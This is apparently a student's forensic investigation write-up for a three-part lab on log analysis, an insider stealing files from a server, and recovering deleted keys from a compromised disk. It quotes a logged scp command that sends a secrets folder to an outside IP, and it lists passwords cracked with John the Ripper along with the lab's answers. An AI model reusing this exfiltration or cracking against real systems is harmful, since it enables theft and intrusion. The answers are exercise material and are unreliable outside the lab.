@@ -1,0 +1,64 @@
+For ACT I,
+At first, I thought it had something to do with Eric's account and him using the commands: mutt and logout very quickly in succession. I even checked the auth.log and found that Eric was logging in and out at around 9 AM. Unfortunately, I don't really have an explanation for this, because I don't know what would be the cause or need of something like that to happen.
+
+After some more investigation, I noticed that in Kevin's bash history, he had a specific command: 
+echo "0 4 * * * rsync -aq --del --rsh="ssh" -e "ssh -l kevin" "kevin.dynip.com:My_Music/" "~/music"" | crontab -
+After looking into what crontab does, I noticed that this command synchronizes his music at the 4th hour of the day. (Which is 4 AM..) This is the cause of the huge spike in internet traffic at that time. Also, if you look inside Kevin's documents, you can see that he has a bunch of music inside his music folder. 
+
+I am pretty confident that the server was NOT compromised. Instead, it was just Kevin copying his music over to his machine. If this is not allowed, I would suggest you disallow Kevin to do such things. 
+
+For ACT II,
+I went through the bash history of each user that had one, and I noticed that Jane did view the secrets, but I did not seem like she did anything harmful to the files.
+Something bad that I noticed was that Mike's bash history has him doing a lot of trying to use John the ripper on the passwd file (though, by making a copy of it to something called "calendar.txt"). 
+
+I also I noticed that Jake had a very fishy commands:
+cp -r /secrets .
+scp -r secrets d000d@207.92.30.41   :~/
+mv secrets .elinks
+First, he makes a copy of the secrets to the folder he's at, then he copies those secrets to his machine at ip 207.92.30.41, and then he moves that folder into a hidden folder called ".elinks". Looking inside .elinks, I found all the "secrets" inside that folder.
+
+When I was finished looking at the bash histories, I went to the auth.log to see if the two accounts had anything in common. The first thing I noticed was that there were multiple failed attempts to log into john, fred, and mike. (all ssh's coming from the same IP) And right after that, a log in accepted to mike's account, and then logged out a minute later.
+20 minutes later in the log, I noticed that mike's account was logged into as root, and a few seconds later, a user named "jake" was created. The account was then ssh'd into right after. 
+
+From what I've gathered, I believe that the kid was able to get into mike's account, create a new account named jake, and run commands pretending to be jake. He used the jake account to do all the copying of the secrets, because he was trying to hide his tracks. 
+
+A few things that can be done here is to make sure the users have a good password and that it's secure so people can't hack into their accounts and run root commands. Another thing to do is, if possible, limit the number of root users who have access to the secrets. If only 1 person has the ability to access and move the secrets around, it would be safer. 
+
+For ACT III,
+First, I did a e2undel on the drive, and I found 4 seemingly important files. These files were:
+inode-368000-ASCII_text
+inode-368001-ASCII_text
+inode-368002-ASCII_text
+inode-368003-ASCII_text
+Three of these included keys (7,8,6) , and the last one seemed to be a bash_history file. 
+
+I read through the bash file and noticed that he made directories .mozilla, .thunderbird, and .games. So, my next step was to look for those after mounting act3. 
+I found those directories under rich's user folder, and I also found some other hidden folders inside his folder as well.
+In the .mozilla folder, I found a file called "cache" with a file called "a234Z8x0", which had the 5th key in it. There seemed to be nothing in the .thunderbird folder. I went through the hidden folders and also found key 4 inside the .extrtmtc folder.
+I was stuck, so I went to the /tmp folder and found another folder called extortomatic-23421. Inside that, I found key 1. 
+
+After that, I couldn't find anymore keys, so I referred to the swapfile of the drive. I used strings on the swapped disk and grep'ed the word "key". Luckily, I found a few interesting things that looked like keys:
+key2 41jade6tree29p
+key2 41jade6tree29~~~
+key 3 29azalea8flower00
+I tried them onto the gpg files, and they worked! (key2 was actually 41jade6tree29)
+
+In total, I found 8 keys (I believe, out of 8). I used these keys as passwords for the gpg files under ~/rich/swiss_keys. From that, I got the following solutions:
+1 - me_and_you_and_you_and_me-so_happy_2gether
+2 - everybody_dance_now_hey_now
+3 - what_would_you_do_if_sang_out_of_tune
+4 - im_pickin_up_good_vibrations
+5 - its_the_little_old_lady_from_pasadena
+6 - raindrops_keep_fallin_on_my_head
+7 - twist_again_like-we_did_last_summer
+8 - goodness_gracious_great_balls_of_fire
+
+It's obvious that the hard drive was compromised (I think it stated it in the intro..) 
+I guess a way to stop this from happening again would be to put some programs that block access to the computer!
+
+Using john on the etc/shadow and I got the following 4 passwords:
+butler           (jeeves)
+moneymoney       (root)
+plants           (gardener)
+food             (chef)
+I'm not sure if there's more, but that was after an hour of letting john run.
